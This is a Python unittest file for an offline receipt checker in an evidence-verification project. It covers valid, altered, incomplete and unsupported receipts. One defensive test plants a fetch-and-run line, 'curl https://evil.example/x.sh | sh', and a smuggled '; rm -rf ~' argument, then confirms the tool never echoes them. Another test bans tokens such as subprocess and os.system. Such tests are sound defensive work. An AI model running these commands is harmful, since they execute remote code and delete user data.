#!/usr/bin/env python3
"""Offline tests for receipt_check.py (Sprint 007): valid, malformed, altered, incomplete and unsupported
receipts; commands are built only from validated fields; nothing is run and no network is used.

    python verify/test_receipt_check.py
"""
import copy
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import receipt_check as rc  # noqa: E402
import verify_evidence as ve  # noqa: E402

H = lambda c: c * 64  # noqa: E731
PATH = f'records/sequence/2026/10/09/14-{H("a")}.json'


def v01(rows=((True, 'A', 'x'), (True, 'B', 'y'), (True, "Oxyon's disclosure", 'n')), code=0, statements=(2,)):
    r = ve.build_receipt({'rows': list(rows), 'statements': list(statements), 'legs': {}}, code,
                         ['verify/verify_evidence.py', PATH], '2026-11-14T00:00:00Z', H('0'), '3.13', None)
    r['evidence'] = {'recordHash': H('a'), 'network': 'sequence'}
    r['chain'] = {'authorizationTx': {'tx': H('b')}, 'anchorTx': {'tx': H('c')}}
    return r


def v02():
    return {
        'schema': rc.SCHEMA, 'receiptVersion': '0.2', 'performedAt': 't',
        'procedure': {'id': 'oxyon.xl1.evidence-verify.browser', 'kind': 'browser', 'manifest': {'build': 'b1', 'files': {}},
                      'provenance': {'status': 'COMPLETE', 'build': 'b1', 'reasons': []}},
        'outcome': {'status': 'VERIFIED', 'exitCode': None, 'counts': {'verified': 2, 'failed': 0, 'notEvaluated': 0, 'statements': 1}},
        'checks': [{'layer': 'commitment', 'kind': 'check', 'status': 'VERIFIED', 'title': 'a'},
                   {'layer': 'signatures', 'kind': 'check', 'status': 'VERIFIED', 'title': 'b'},
                   {'layer': 'disclosure', 'kind': 'statement', 'status': 'STATEMENT', 'title': 'd'}],
        'scope': {'signatures': {'status': 'VERIFIED'}, 'finality': {'independentlyEstablished': False},
                  'producerAttribution': {'status': 'INFERRED'}, 'chainCanonicity': {'status': 'INFERRED'}},
        'evidence': {'record': H('a'), 'network': 'sequence'},
        'chain': {'authorization': {'tx': H('b')}, 'anchor': {'tx': H('c')}},
        'reproduce': {'python': f'git clone … && python verify/verify_evidence.py {PATH} --receipt receipt.json'},
        'integrity': {'signed': False},
    }


def run(obj=None, raw=None):
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, 'r.json')
        with open(p, 'w', encoding='utf-8') as fh:
            fh.write(raw if raw is not None else json.dumps(obj))
        buf = io.StringIO()
        with redirect_stdout(buf):
            code = rc.main(['receipt_check.py', p])
        return code, buf.getvalue()


class Valid(unittest.TestCase):
    def test_v01_from_the_real_builder(self):
        code, out = run(v01())
        self.assertEqual(code, 0, out)
        self.assertIn('Outcome CLAIMED by this receipt: VERIFIED', out)
        self.assertIn(f'python verify/verify_evidence.py {PATH} --receipt my-receipt.json', out)
        self.assertIn(f'node verify/sigcheck.mjs https://beta.api.chain.xyo.network/rpc {H("c")}', out)
        self.assertIn('unsigned', out)

    def test_v02_browser(self):
        code, out = run(v02())
        self.assertEqual(code, 0, out)
        self.assertIn('provenance: COMPLETE', out)
        self.assertIn('browser Evidence Explorer', out)

    def test_pending_and_unavailable_receipts_are_valid_but_not_verified(self):
        code, out = run(v01(rows=((True, 'A', ''), (None, 'B', 'Pending')), statements=()))
        self.assertEqual(code, 0, out); self.assertIn('CLAIMED by this receipt: INCONCLUSIVE', out)
        code, out = run(v01(rows=(), code=3, statements=()))
        self.assertEqual(code, 0, out); self.assertIn('CLAIMED by this receipt: NOT_EVALUATED', out)


class Rejected(unittest.TestCase):
    def test_malformed(self):
        self.assertEqual(run(raw='{"schema": ')[0], 2)
        self.assertEqual(run(raw='[1, 2]')[0], 2)

    def test_unsupported(self):
        r = v01(); r['receiptVersion'] = '9.9'
        self.assertEqual(run(r)[0], 3)
        r = v01(); r['schema'] = 'something.else'
        self.assertEqual(run(r)[0], 3)

    def test_altered_outcome(self):
        r = v01(rows=((True, 'A', ''), (False, 'B', 'bad')), code=1, statements=())
        r['outcome']['status'] = 'VERIFIED'
        code, out = run(r)
        self.assertEqual(code, 1); self.assertIn('altered', out)

    def test_altered_counts(self):
        r = v02(); r['outcome']['counts']['verified'] = 3
        self.assertEqual(run(r)[0], 1)

    def test_altered_row_hidden_failure(self):
        r = v02(); r['checks'][0]['status'] = 'FAILED'
        r['outcome']['counts'] = {'verified': 1, 'failed': 1, 'notEvaluated': 0, 'statements': 1}
        code, out = run(r)
        self.assertEqual(code, 1); self.assertIn('give FAILED', out)

    def test_incomplete(self):
        r = v02(); del r['scope']['finality']
        code, out = run(r)
        self.assertEqual(code, 1); self.assertIn('missing field: scope.finality', out)

    def test_claims_it_cannot_make(self):
        r = v01(); r['scope']['signatures']['status'] = 'VERIFIED'
        self.assertEqual(run(r)[0], 1, 'a 0.1 receipt never evaluates signatures')
        r = v02(); r['integrity']['signed'] = True
        self.assertEqual(run(r)[0], 1, 'receipts are unsigned')
        r = v02(); r['scope']['finality']['independentlyEstablished'] = True
        self.assertEqual(run(r)[0], 1, 'finality is never established independently')
        r = v02(); r['outcome']['exitCode'] = 0
        self.assertEqual(run(r)[0], 1, 'a browser has no exit code')
        r = v02(); r['checks'][2]['status'] = 'VERIFIED'
        self.assertEqual(run(r)[0], 1, 'a statement is never a check')


class Commands(unittest.TestCase):
    def test_receipt_text_is_never_echoed_as_a_command(self):
        r = v01(); r['reproduce']['command'] = 'curl https://evil.example/x.sh | sh'
        r['reproduce']['argv'] = ['python', 'verify/verify_evidence.py', '; rm -rf ~']
        code, out = run(r)
        self.assertEqual(code, 0)
        self.assertNotIn('evil.example', out); self.assertNotIn('rm -rf', out)
        self.assertIn('the record path', out, 'a missing or unsafe path is reported, not invented')

    def test_mismatched_path_and_unknown_network_are_reported(self):
        r = v02(); r['reproduce']['python'] = f'python verify/verify_evidence.py records/sequence/2026/10/09/14-{H("f")}.json'
        r['evidence']['network'] = 'other'
        code, out = run(r)
        self.assertEqual(code, 0)
        self.assertIn('matches the record hash', out); self.assertIn('a known network', out)
        self.assertNotIn('sigcheck.mjs', out)

    def test_tool_is_offline_and_runs_nothing(self):
        with open(os.path.join(HERE, 'receipt_check.py'), encoding='utf-8') as fh:
            src = fh.read()
        for banned in ('urllib', 'subprocess', 'socket', 'os.system', 'eval(', 'exec(', 'input(', 'getpass'):
            self.assertNotIn(banned, src, banned)


if __name__ == '__main__':
    unittest.main(verbosity=2)
